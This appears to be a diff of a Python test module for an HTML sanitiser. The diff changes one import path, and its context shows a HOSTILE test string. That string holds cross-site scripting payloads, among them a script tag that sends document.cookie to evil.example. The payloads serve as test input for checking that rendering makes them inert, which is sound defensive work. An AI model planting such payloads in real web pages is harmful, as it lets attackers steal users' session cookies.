@@ -4,7 +4,7 @@ from __future__ import annotations
 
 import re
 
-from ml_stack.sentinel.inert import render_html, render_text
+from poolhouse.sentinel.inert import render_html, render_text
 
 HOSTILE = ('<script>fetch("https://evil.example/?c="+document.cookie)</script>'
            '<img src=x onerror=alert(1)><iframe src="javascript:alert(1)"></iframe>'
